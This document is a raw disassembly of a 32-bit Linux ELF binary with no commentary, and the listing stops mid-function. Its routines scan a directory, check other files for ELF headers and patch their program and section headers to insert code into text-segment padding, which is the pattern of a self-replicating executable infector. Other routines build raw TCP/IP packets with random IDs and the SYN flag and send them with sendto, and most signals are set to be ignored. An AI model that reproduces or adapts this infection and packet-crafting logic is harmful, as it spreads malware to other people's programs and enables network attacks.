jmp 0x8049335
dec edi
push ebx
inc esi
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
mov eax, section..text
pushal
call fcn.0804a200
popal
jmp eax
jmp dword [reloc.atol]
jmp dword [reloc.usleep]
jmp dword [reloc.__register_frame_info]
jmp dword [reloc.perror]
jmp dword [reloc.signal]
jmp dword [reloc.random]
jmp dword [reloc.malloc]
jmp dword [reloc.sendto]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.fgets]
jmp dword [reloc.__libc_start_main]
jmp dword [reloc.printf]
jmp dword [reloc.memcpy]
jmp dword [reloc.fclose]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.exit]
jmp dword [reloc.atoi]
jmp dword [reloc.fopen]
jmp dword [reloc.sprintf]
jmp dword [reloc.socket]
pop ebx
add ebx, 0x1de7
cmp dword [ebx + 0x5c], 0
je 0x8048566
call loc.imp.__gmon_start__
mov esi, esi
call fcn.08048750
call fcn.08049190
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x804876b
push section..bss
push section..eh_frame
call sym.imp.__register_frame_info
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, section..ctors
cmp dword [section..ctors], 0xffffffff
je 0x80491ae
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x80491a2
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_ch]
mov edx, dword [arg_8h]
xor ebx, ebx
xor esi, esi
cmp edi, 1
jle 0x80487a5
movzx eax, word [edx]
add ebx, eax
add edx, 2
add edi, 0xfffffffe
cmp edi, 1
jg 0x8048795
cmp edi, 1
jne 0x80487b5
mov ecx, esi
mov cl, byte [edx]
mov esi, ecx
movzx eax, si
add ebx, eax
mov eax, ebx
sar eax, 0x10
mov edx, ebx
movzx edx, dx
lea ebx, [edx + eax]
mov eax, ebx
sar eax, 0x10
add ebx, eax
mov esi, ebx
not si
movzx eax, si
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10024
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
mov ecx, dword [ebx + 0xc]
mov dword [ebp - 0x10000], ecx
mov dword [ebp - 0x1000c], ecx
mov edx, dword [ebx + 0x10]
mov dword [ebp - 0x10008], edx
mov byte [ebp - 0x10004], 0
mov byte [ebp - 0x10003], 6
mov eax, dword [n]
add eax, 0x14
xchg ah, al
mov word [ebp - 0x10002], ax
mov dword [ebp - 0xfffc], edx
mov eax, dword [ebp - 0x10004]
mov dword [ebp - 0xfff8], eax
lea edx, [ebp - 0xfff4]
mov eax, dword [arg_ch]
mov edi, edx
mov esi, eax
cld
mov ecx, 5
rep movsd dword es:[edi], dword ptr [esi]
lea eax, [ebp - 0xffe0]
mov ecx, dword [n]
push ecx
mov esi, dword [s2]
push esi
push eax
call sym.imp.memcpy
mov edi, dword [n]
mov dword [edi + ebp - 0xffe0], 0
mov eax, dword [n]
add eax, 0x21
and al, 0xfe
push eax
lea ecx, [ebp - 0x10000]
mov dword [ebp - 0x10024], ecx
push ecx
call fcn.08048780
mov esi, dword [arg_ch]
mov word [esi + 0x10], ax
mov al, byte [ebx]
and al, 0xf
and eax, 0xff
shl eax, 2
push eax
push ebx
mov edi, dword [ebp - 0x10024]
push edi
call sym.imp.memcpy
mov al, byte [ebx]
and al, 0xf
and eax, 0xff
lea edx, [ebp + eax*4 - 0x10000]
mov eax, dword [arg_ch]
mov edi, edx
mov esi, eax
cld
mov ecx, 5
rep movsd dword es:[edi], dword ptr [esi]
mov al, byte [ebx]
and al, 0xf
and eax, 0xff
lea eax, [ebp + eax*4 - 0xffec]
add esp, 0x20
mov ecx, dword [n]
push ecx
mov esi, dword [s2]
push esi
push eax
call sym.imp.memcpy
mov al, byte [ebx]
and al, 0xf
and eax, 0xff
shl eax, 2
lea edx, [ebp + eax]
mov edi, dword [n]
mov dword [edi + edx - 0xffec], 0
add edi, 0x14
mov dword [ebp - 0x10020], edi
lea eax, [edi + eax + 1]
and al, 0xfe
push eax
mov ecx, dword [ebp - 0x10024]
push ecx
call fcn.08048780
mov word [ebx + 0xa], ax
mov al, byte [ebx]
and al, 0xf
and eax, 0xff
shl eax, 2
push eax
push ebx
mov esi, dword [ebp - 0x10024]
push esi
call sym.imp.memcpy
mov word [ebp - 0x1001c], 2
mov edi, dword [arg_ch]
mov ax, word [edi + 2]
mov word [ebp - 0x1001a], ax
mov eax, dword [ebx + 0x10]
mov dword [ebp - 0x10018], eax
add esp, 0x20
push 0x10
lea eax, [ebp - 0x1001c]
push eax
push 0
mov al, byte [ebx]
and al, 0xf
and eax, 0xff
mov ecx, dword [ebp - 0x10020]
lea eax, [ecx + eax*4]
push eax
push esi
push dword [0x804a470]
call sym.imp.sendto
lea esp, [ebp - 0x10030]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push fcn.080487dc
push 1
call sym.imp.signal
push fcn.080487dc
push 2
call sym.imp.signal
push fcn.080487dc
push 3
call sym.imp.signal
push fcn.080487dc
push 4
call sym.imp.signal
add esp, 0x20
push fcn.080487dc
push 5
call sym.imp.signal
push fcn.080487dc
push 6
call sym.imp.signal
push fcn.080487dc
push 7
call sym.imp.signal
push fcn.080487dc
push 8
call sym.imp.signal
add esp, 0x20
push fcn.080487dc
push 9
call sym.imp.signal
push fcn.080487dc
push 0xa
call sym.imp.signal
push fcn.080487f4
push 0xb
call sym.imp.signal
push fcn.080487dc
push 0xc
call sym.imp.signal
add esp, 0x20
push fcn.080487dc
push 0xd
call sym.imp.signal
push fcn.080487dc
push 0xe
call sym.imp.signal
push fcn.080487dc
push 0xf
call sym.imp.signal
push fcn.080487dc
push 0x11
call sym.imp.signal
add esp, 0x20
push fcn.080487dc
push 0x12
call sym.imp.signal
push fcn.080487dc
push 0x13
call sym.imp.signal
push fcn.080487dc
push 0x14
call sym.imp.signal
push fcn.080487dc
push 0x15
call sym.imp.signal
add esp, 0x20
push fcn.080487dc
push 0x16
call sym.imp.signal
push fcn.080487dc
push 0x17
call sym.imp.signal
push fcn.080487dc
push 0x18
call sym.imp.signal
push fcn.080487dc
push 0x19
call sym.imp.signal
add esp, 0x20
push fcn.080487dc
push 0x1a
call sym.imp.signal
push fcn.080487dc
push 0x1b
call sym.imp.signal
push fcn.080487dc
push 0x1c
call sym.imp.signal
push fcn.080487dc
push 0x1d
call sym.imp.signal
add esp, 0x20
push fcn.080487dc
push 0x1e
call sym.imp.signal
leave
ret
push ebp
mov ebp, esp
sub esp, 0x440
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
mov edi, dword [arg_10h]
mov byte [var_14h], 0x45
mov byte [var_13h], 0
mov word [var_12h], 0x28
call sym.imp.random
mov edx, eax
xchg dh, dl
mov word [var_10h], dx
mov word [var_eh], 0
mov byte [var_ch], 0x1e
mov byte [var_bh], 6
mov word [var_ah], 0
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ax, word [0x804a458]
xchg ah, al
mov word [var_28h], ax
mov eax, edi
xchg ah, al
mov word [var_26h], ax
mov dword [var_24h], 0x39683728
mov al, byte [var_1ch]
and al, 0xf
or al, 0x50
mov byte [var_1ch], al
mov dword [var_20h], 0
and al, 0x50
mov byte [var_1ch], al
mov byte [var_1bh], 2
mov word [var_1ah], 0xffff
mov word [var_18h], 0
mov word [var_16h], 0
push 0
push 0x8049242
lea eax, [var_28h]
push eax
lea eax, [var_14h]
push eax
call fcn.0804880c
lea edi, [var_438h]
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
add ecx, 0x28376839
mov dword [0x804a464], ecx
lea esp, [var_44ch]
pop ebx
pop esi
pop edi
leave
ret
pop ebx
add ebx, 0x1173
call fcn.08048700
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
cmp dword [0x804a31c], 0
jne 0x8048744
jmp 0x804871d
mov esi, esi
lea edx, [eax + 4]
mov dword [0x804a318], edx
mov eax, dword [eax]
call eax
mov eax, dword [0x804a318]
cmp dword [eax], 0
jne 0x8048710
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x804873a
push section..eh_frame
call sym.imp.__deregister_frame_info
mov dword [0x804a31c], 1
leave
ret
push ebp
mov ebp, esp
sub esp, 0x100c
push edi
push esi
push ebx
call fcn.0804a0e8
test eax, eax
je 0x804a28f
lea eax, [var_1004h]
push eax
call fcn.08049f90
mov edi, eax
add esp, 4
test edi, edi
je 0x804a28f
call edi
test eax, eax
jne 0x804a28f
push dword [var_1004h]
push edi
call fcn.0804a154
push 0x18
call fcn.08049370
add esp, 0xc
test eax, eax
jne 0x804a28f
push 0x1000
lea esi, [var_1000h]
push esi
push 0xb7
call fcn.08049390
push 8
lea ebx, [var_100ch]
push ebx
push 3
call fcn.08049624
push ebx
push 0xc
call fcn.0804937c
add esp, 0x20
push dword [var_1004h]
push edi
call fcn.0804a154
push esi
push 0xc
call fcn.0804937c
lea esp, [var_1018h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x80
push esi
push ebx
push 0x80
lea esi, [var_80h]
push esi
push 2
call fcn.08049624
push 0
push 0
push esi
push 5
call fcn.080493a8
mov ebx, eax
add esp, 0x1c
test ebx, ebx
jl 0x804a129
push 0x80
push esi
push ebx
push 3
call fcn.080493a8
add esp, 0x10
push ebx
push 6
call fcn.0804937c
push esi
call fcn.08049584
cmp eax, 0x12b
jg 0x804a144
xor eax, eax
jmp 0x804a149
mov esi, esi
mov eax, 1
lea esp, [var_88h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x47c
push edi
push esi
push ebx
mov dword [var_478h], 0
lea esi, [var_400h]
push 0x400
push esi
push 0
call fcn.08049624
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ebx, [esi + ecx - 1]
push 0x14
call fcn.08049370
mov edx, eax
push edx
call fcn.08049544
mov edx, eax
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ecx, [esi + ecx - 1]
add edx, ecx
push 5
push edx
push 1
call fcn.08049624
add esp, 0x20
push ebx
push 0x14
call fcn.08049370
add esp, 4
mov edx, eax
push edx
call fcn.08049f3c
push 0
push 0
push esi
push 5
call fcn.080493a8
mov ebx, eax
add esp, 0x18
test ebx, ebx
jl 0x804a0b4
push 0x34
lea eax, [var_474h]
push eax
push ebx
call fcn.080493fc
add esp, 0xc
cmp eax, 1
jne 0x804a0b4
push 0
push dword [var_468h]
push ebx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x804a0b4
lea eax, [var_440h]
push eax
push ebx
push 0x6c
call fcn.08049390
add esp, 0xc
test eax, eax
jl 0x804a0b4
mov eax, dword [var_468h]
mov edi, dword [var_42ch]
sub edi, eax
push edi
call fcn.080493c8
mov dword [var_478h], eax
add esp, 4
test eax, eax
je 0x804a0b4
push edi
push eax
push ebx
call fcn.080493fc
mov edx, eax
add esp, 0xc
cmp edx, 1
jne 0x804a0b4
mov eax, dword [arg_8h]
mov dword [eax], edi
push ebx
push 6
call fcn.0804937c
mov eax, dword [var_478h]
jmp 0x804a0dd
nop
cmp ebx, 0xffffffff
je 0x804a0c4
push ebx
push 6
call fcn.0804937c
add esp, 8
cmp dword [var_478h], 0
je 0x804a0db
mov eax, dword [var_478h]
push eax
push 0x2d
call fcn.0804937c
xor eax, eax
lea esp, [var_488h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x130
push edi
push esi
push ebx
lea edx, [var_12ch]
mov dword [var_130h], edx
lea ebx, [var_122h]
mov esi, 0xc8
mov byte [var_12ch], 0x2e
mov byte [var_12bh], 0
push 0
push 0
push edx
push 5
call fcn.080493a8
mov edi, eax
add esp, 0x10
test edi, edi
jge 0x804a1d5
mov eax, 0xffffffff
jmp 0x804a1f5
lea esi, [esi]
test esi, esi
jl 0x804a1ed
push ebx
call fcn.08049504
add eax, ebx
add esp, 4
cmp byte [eax - 2], 0x70
jne 0x804a1bf
cmp byte [eax - 1], 0x73
je 0x804a1d5
mov edx, dword [arg_ch]
push edx
mov edx, dword [arg_8h]
push edx
push ebx
call fcn.08049854
add esp, 0xc
test eax, eax
jne 0x804a1d5
dec esi
push 1
mov edx, dword [var_130h]
push edx
push edi
push 0x59
call fcn.080493a8
add esp, 0x10
test eax, eax
jg 0x804a1a4
push edi
push 6
call fcn.0804937c
lea esp, [var_13ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
int 0x80
leave
ret
push ebp
mov ebp, esp
push ebx
push ecx
mov eax, dword [arg_10h]
mov ebx, dword [arg_14h]
mov ecx, dword [arg_18h]
int 0x80
pop ecx
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
call fcn.080495f4
mov esi, eax
test ebx, ebx
jle 0x8049647
nop
cmp byte [esi], 0
jne 0x8049642
dec ebx
inc esi
test ebx, ebx
jg 0x804963c
mov eax, dword [arg_10h]
push eax
push 0
mov edi, dword [arg_ch]
push edi
call fcn.080494e0
mov edx, esi
mov edi, edx
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov eax, dword [arg_10h]
cmp ecx, eax
ja 0x8049684
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ebx, [ecx - 1]
jmp 0x8049687
lea esi, [esi]
mov ebx, dword [arg_10h]
xor ecx, ecx
cmp ecx, ebx
jge 0x80496b5
lea esi, [esi]
mov dl, byte [ecx + esi]
test dl, dl
je 0x80496b0
mov byte [var_4h], dl
and byte [var_4h], 0xf0
sub dl, byte [var_4h]
add byte [var_4h], 0xf
mov al, byte [var_4h]
sub al, dl
mov edi, dword [arg_ch]
mov byte [ecx + edi], al
inc ecx
cmp ecx, ebx
jl 0x8049690
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
int 0x80
pop ebx
leave
ret
pop eax
sub eax, 0x4e
jmp 0x8049362
call fcn.08049355
leave
ret
push ebp
mov ebp, esp
push ebx
push ecx
push edx
mov eax, dword [arg_14h]
mov ebx, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_20h]
int 0x80
pop edx
pop ecx
pop ebx
leave
ret
pop eax
jmp loc.0804961f
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
call fcn.080495f4
mov esi, eax
test ebx, ebx
jle 0x8049647
nop
cmp byte [esi], 0
jne 0x8049642
dec ebx
inc esi
test ebx, ebx
jg 0x804963c
mov eax, dword [arg_10h]
push eax
push ebp
mov ebp, esp
jmp 0x80495fc
pop eax
jmp loc.0804961f
call fcn.080495f9
and byte [edi + 0x7d], bh
pushal
insb byte es:[edi], dx
and byte [eax], al
and byte [edx + 0x77], ch
push 0
and byte [edi + 0x7d], bh
pushal
insb byte es:[edi], dx
and byte [edx + 0x7f], bh
jnp 0x804967d
bound ebp, qword [edx]
and byte [arg_66h], ch
popal
add cl, cl
leave
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [arg_10h]
mov cl, byte [arg_ch]
xor eax, eax
cmp eax, edx
jge 0x80494fc
nop
mov byte [eax + ebx], cl
inc eax
cmp eax, edx
jl 0x80494f4
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_ch]
push dword [arg_10h]
push ebx
push dword [arg_8h]
push 0x13
call fcn.080493a8
cmp eax, ebx
jne 0x80494a4
mov eax, 1
jmp 0x80494a6
xor eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
nop
push ebx
push esi
push edi
push 3
call fcn.080493a8
add esp, 0x10
cmp eax, ebx
jne 0x8049424
mov eax, 1
jmp 0x8049438
test eax, eax
jg 0x8049430
test ebx, ebx
jle 0x8049430
xor eax, eax
jmp 0x8049438
sub ebx, eax
add byte [esi], al
jmp 0x804940c
mov esi, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
cmp byte [edx], 0x7f
jne 0x8049850
cmp byte [edx + 1], 0x45
jne 0x8049850
cmp byte [edx + 2], 0x4c
jne 0x8049850
cmp byte [edx + 3], 0x46
jne 0x8049850
cmp word [edx + 0x10], 2
jne 0x8049850
mov ax, word [edx + 0x12]
cmp ax, 3
je 0x804983c
cmp ax, 6
jne 0x8049850
cmp dword [edx + 0x14], 1
jne 0x8049850
cmp word [edx + 0xa], 1
ja 0x8049850
mov eax, 1
jmp 0x8049852
xor eax, eax
leave
ret
push ebp
mov ebp, esp
sub esp, 0x100c
push edi
push esi
push ebx
mov eax, dword [arg_40h]
xor ebx, ebx
movzx edx, word [arg_38h]
cmp ebx, edx
jge 0x80496fb
lea esi, [esi]
cmp dword [eax + 4], 0
jne 0x80496ec
cmp dword [eax], 1
jne 0x80496f3
mov esi, eax
jmp 0x80496f3
nop
cmp dword [eax], 1
jne 0x80496f3
mov ecx, eax
add eax, 0x20
inc ebx
cmp ebx, edx
jl 0x80496dc
mov edx, dword [esi + 8]
mov eax, edx
add eax, dword [esi + 0x10]
mov ecx, dword [ecx + 8]
sub ecx, eax
mov eax, ecx
cmp eax, 0xfff
jle 0x804971c
mov eax, 3
jmp 0x80497fa
nop
mov eax, dword [arg_24h]
mov ecx, eax
sub ecx, edx
add ecx, dword [esi + 4]
add edx, dword [esi + 0x14]
sub edx, eax
lea eax, [edx - 1]
cmp eax, 0xfff
jbe 0x8049740
mov eax, 2
jmp 0x80497fa
nop
cmp edx, 0x1000
ja 0x804974c
mov esi, edx
jmp 0x8049751
mov esi, 0x1000
push 0
push ecx
mov edi, dword [arg_8h]
push edi
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x80497e9
push esi
lea edi, [var_1000h]
mov dword [var_100ch], edi
push edi
mov edi, dword [arg_8h]
push edi
call fcn.080493fc
cmp eax, 1
jne 0x80497e9
xor ebx, ebx
lea eax, [esi - 4]
cmp ebx, eax
jge 0x80497e9
mov edi, dword [var_100ch]
mov dword [var_1008h], edi
mov dword [var_1004h], eax
nop
mov edi, dword [var_100ch]
mov esi, dword [edi]
mov edi, dword [var_1008h]
cmp byte [edi + ebx + 3], 0
je 0x80497da
xor ecx, ecx
movzx edx, word [arg_3ch]
cmp ecx, edx
jge 0x80497da
mov eax, edx
mov edx, dword [arg_44h]
add edx, 4
nop
cmp esi, dword [edx + 8]
jne 0x80497d2
cmp dword [edx], 1
je 0x80497f0
add edx, 0x28
inc ecx
cmp ecx, eax
jl 0x80497c8
inc dword [var_100ch]
inc ebx
cmp ebx, dword [var_1004h]
jl 0x80497a0
mov eax, 0xffffffff
jmp 0x80497fa
mov eax, dword [arg_48h]
mov dword [eax], esi
mov eax, 1
lea esp, [var_1018h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
nop
push ebx
push esi
push edi
push 4
call fcn.080493a8
add esp, 0x10
cmp eax, ebx
jne 0x8049468
mov eax, 1
jmp 0x804947c
test eax, eax
jg 0x8049474
test ebx, ebx
jle 0x8049474
xor eax, eax
jmp 0x804947c
sub ebx, eax
add byte [esi], al
jmp 0x8049450
mov esi, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, 0xf86
leave
ret
push ebp
mov ebp, esp
jmp 0x804935d
pop eax
sub eax, 0x4e
jmp 0x8049362
call fcn.08049355
push ebp
mov ebp, esp
mov eax, 0x21
inc eax
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push esi
push ebx
mov esi, dword [arg_8h]
xor ecx, ecx
test esi, esi
jg 0x804955c
mov eax, 1
jmp 0x804957d
mov ebx, 0x66666667
lea esi, [esi]
mov eax, esi
imul ebx
sar edx, 2
sar esi, 0x1f
mov dword [var_4h], esi
mov esi, edx
sub esi, dword [var_4h]
inc ecx
test esi, esi
jg 0x8049564
mov eax, ecx
lea esp, [var_ch]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
mov edi, dword [arg_ch]
push ebx
call fcn.08049544
lea ecx, [eax - 1]
test ecx, ecx
jl 0x8049f88
mov esi, 0x66666667
lea esi, [esi]
mov eax, ebx
imul esi
sar edx, 2
mov dword [var_4h], ebx
sar dword [var_4h], 0x1f
sub edx, dword [var_4h]
lea eax, [edx + edx*4]
add eax, eax
sub ebx, eax
mov dword [var_4h], ebx
mov ebx, edx
mov al, byte [var_4h]
add al, 0x30
mov byte [ecx + edi], al
dec ecx
jns 0x8049f60
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
mov ebx, dword [arg_8h]
push 0
push 0x2d
call fcn.0804937c
mov esi, eax
add ebx, esi
push ebx
push 0x2d
call fcn.0804937c
cmp eax, esi
je 0x80493f0
mov eax, esi
jmp 0x80493f2
lea esi, [esi]
xor eax, eax
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
push edi
push esi
push ebx
xor esi, esi
mov dword [var_8h], 0
mov edi, dword [arg_8h]
mov al, byte [edi]
jmp 0x80495a7
lea esi, [esi]
inc esi
mov edi, dword [arg_8h]
mov al, byte [esi + edi]
add al, 0xd0
cmp al, 9
jbe 0x80495a0
xor ebx, ebx
cmp ebx, esi
jge 0x80495e6
lea edi, [esi - 1]
mov dword [var_4h], edi
lea esi, [esi]
mov edi, dword [arg_8h]
movsx eax, byte [ebx + edi]
add eax, 0xffffffd0
xor ecx, ecx
mov edx, dword [var_4h]
sub edx, ebx
cmp ecx, edx
jge 0x80495de
lea esi, [esi]
lea eax, [eax + eax*4]
add eax, eax
inc ecx
cmp ecx, edx
jl 0x80495d4
add dword [var_8h], eax
inc ebx
cmp ebx, esi
jl 0x80495bc
mov eax, dword [var_8h]
lea esp, [var_14h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
xor eax, eax
cmp byte [edx], 0
je 0x804951b
lea esi, [esi]
inc edx
inc eax
cmp byte [edx], 0
jne 0x8049514
leave
ret
push ebp
mov ebp, esp
sub esp, 0xf8
push edi
push esi
push ebx
lea eax, [var_b4h]
push eax
mov ecx, dword [arg_8h]
push ecx
push 0x6a
call fcn.08049390
add esp, 0xc
test eax, eax
jl 0x8049f29
mov eax, dword [var_94h]
mov dword [var_bch], eax
mov eax, dword [var_8ch]
lea ecx, [var_bch]
mov dword [var_ech], ecx
mov dword [ecx + 4], eax
push 0
push 2
mov ecx, dword [arg_8h]
push ecx
push 5
call fcn.080493a8
mov dword [var_c4h], eax
add esp, 0x10
test eax, eax
jl 0x8049f12
push 0x34
lea ecx, [var_74h]
mov dword [var_f4h], ecx
mov dword [var_c8h], ecx
push ecx
mov ecx, dword [var_c4h]
push ecx
call fcn.080493fc
add esp, 0xc
test eax, eax
je 0x8049f12
mov ecx, dword [var_f4h]
push ecx
call fcn.08049808
add esp, 4
test eax, eax
je 0x8049f12
mov dword [var_cch], esp
movzx edi, word [var_48h]
movzx eax, word [var_44h]
mov dword [var_d0h], edi
shl dword [var_d0h], 5
sub esp, dword [var_d0h]
mov dword [var_d4h], esp
xor ebx, ebx
mov dword [var_d8h], 0
lea eax, [eax + eax*4]
shl eax, 3
mov dword [var_e4h], eax
sub esp, eax
mov dword [var_e8h], esp
push 0
push dword [var_58h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
mov ecx, dword [var_d0h]
push ecx
mov ecx, dword [var_d4h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.080493fc
add esp, 0xc
test eax, eax
je 0x8049f0c
push 0
push dword [var_54h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
mov ecx, dword [var_e4h]
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.080493fc
add esp, 0xc
test eax, eax
je 0x8049f0c
mov dword [var_f8h], 0
cmp ebx, edi
jge 0x8049a17
mov esi, dword [var_d4h]
add esi, 4
mov eax, dword [var_d4h]
xor edx, edx
mov esi, esi
cmp dword [esi + edx], 0
jne 0x80499f8
cmp dword [eax], 1
jne 0x8049a03
mov ebx, eax
jmp 0x8049a03
nop
cmp dword [eax], 1
jne 0x8049a03
mov dword [var_d8h], eax
add eax, 0x20
add edx, 0x20
inc dword [var_f8h]
cmp dword [var_f8h], edi
jl 0x80499e8
test ebx, ebx
je 0x8049f0c
cmp dword [var_d8h], 0
je 0x8049f0c
mov ecx, dword [ebx + 0x10]
mov dword [var_dch], ecx
mov ecx, dword [ebx + 4]
add dword [var_dch], ecx
mov ecx, dword [ebx + 0x14]
mov dword [var_e0h], ecx
mov ecx, dword [ebx + 8]
add dword [var_e0h], ecx
lea ecx, [var_c0h]
mov dword [var_f0h], ecx
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_d4h]
push ecx
add esp, 0xffffffcc
mov edi, esp
mov esi, dword [var_c8h_2]
cld
mov ecx, 0xd
rep movsd dword es:[edi], dword ptr [esi]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.080496c0
add esp, 0x44
cmp eax, 1
je 0x8049d6c
jle 0x8049f0c
cmp eax, 2
je 0x8049dc8
cmp eax, 3
jne 0x8049f0c
mov dword [var_f8h], 0
cmp word [var_48h], 0
je 0x8049b27
mov ebx, dword [var_d4h]
add ebx, 0x14
mov esi, dword [var_d4h]
add esi, 0x10
mov edx, dword [var_d4h]
add edx, 4
xor edi, edi
mov eax, dword [edx]
cmp eax, dword [var_dch]
jb 0x8049aed
add eax, 0x1000
mov dword [edx], eax
test eax, eax
jne 0x8049b09
mov ecx, dword [var_d4h]
cmp dword [ecx + edi], 1
jne 0x8049b09
add dword [esi], 0x1000
add dword [ebx], 0x1000
add ebx, 0x20
add esi, 0x20
add edx, 0x20
add edi, 0x20
inc dword [var_f8h]
movzx eax, word [var_48h]
cmp dword [var_f8h], eax
jl 0x8049adc
mov dword [var_f8h], 0
movzx esi, word [var_44h]
cmp dword [var_f8h], esi
jge 0x8049b6e
mov edx, dword [var_e8h]
add edx, 0x10
mov esi, esi
mov eax, dword [edx]
cmp eax, dword [var_dch]
jbe 0x8049b5d
add eax, 0x1000
mov dword [edx], eax
movzx esi, word [var_44h]
add edx, 0x28
inc dword [var_f8h]
cmp dword [var_f8h], esi
jl 0x8049b48
push 0
push dword [var_58h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
mov ecx, dword [var_d0h]
push ecx
mov ecx, dword [var_d4h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
push 0
push dword [var_54h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
mov ecx, dword [var_e4h]
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
mov edi, esp
mov ebx, dword [var_a0h]
sub ebx, dword [var_dch]
mov eax, ebx
and eax, 0x1fffffff
add eax, 3
and eax, 0x3ffffffc
sub esp, eax
mov esi, esp
push 0
mov ecx, dword [var_dch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
push ebx
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.080493fc
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
push 0
mov eax, dword [var_dch]
add eax, 0x1000
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
push ebx
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
cmp eax, 1
jne 0x8049f0c
mov esp, edi
push 0
mov ecx, dword [var_dch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
call fcn.08049364
push eax
call fcn.08049350
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
push 0
call fcn.08049344
add eax, dword [var_dch]
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
push 4
lea eax, [var_5ch]
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
mov word [var_6ah], 2
